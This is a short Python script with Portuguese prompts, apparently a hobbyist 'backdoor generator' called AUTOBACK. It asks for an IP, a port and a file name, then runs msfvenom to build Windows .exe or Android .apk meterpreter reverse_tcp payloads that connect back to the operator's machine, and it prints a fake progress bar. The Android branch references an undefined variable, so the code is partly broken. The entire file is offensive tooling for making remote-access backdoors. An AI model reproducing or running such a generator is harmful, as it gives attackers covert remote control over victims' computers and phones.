# --coding: utf-8 --
import os
import sys

def banner():
	print("""

░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░██║░░░██║░░░██║░░██║██████╦╝███████║██║░░╚═╝█████═╝░
██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔══██╗██╔══██║██║░░██╗██╔═██╗░
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██████╦╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒ 
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒ Coded By: Kira"
▒▒█▒▒███████▄██████▒▒▒ 25 de jun de 2021"
▒▒▒▒▒██████████████▒▒▒ AUTOBACK.v01"
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
	""")

banner()
os.system("sleep 1")

print("""
========GERADOR BACKDOOR========
[ 1 ] Windows
[ 2 ] Android
================================
""")

opção = int(input("Digite a opção que deseja: "))
os.system("sleep 1")

ip = input("Digite o seu ip: ")
os.system("sleep 1")

port = input("Digite a porta, Recomendado 4444: ")
os.system("sleep 1")

nome = input("Digite o nome do seu backdoor: ")
os.system("sleep 1")

if opção == 1:
	os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST={ip} LPORT={port} R > {nome}.exe")
elif opção == 2:
	os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} R > {nome}.apk")
else:
	print("Opção inválida, escolha outra opção")

os.system("sleep 1")
os.system("clear")

print("[=                     ]")
os.system("sleep 1")
os.system("clear")
print("[===                   ]")
os.system("sleep 1")
os.system("clear")
print("============           ]")
os.system("sleep 1")
os.system("clear")
print("[==================    ]")
os.system("sleep 1")
os.system("clear")
print("[======================]")

print("BACKDOOR CRIADO COM SUCESSO!")
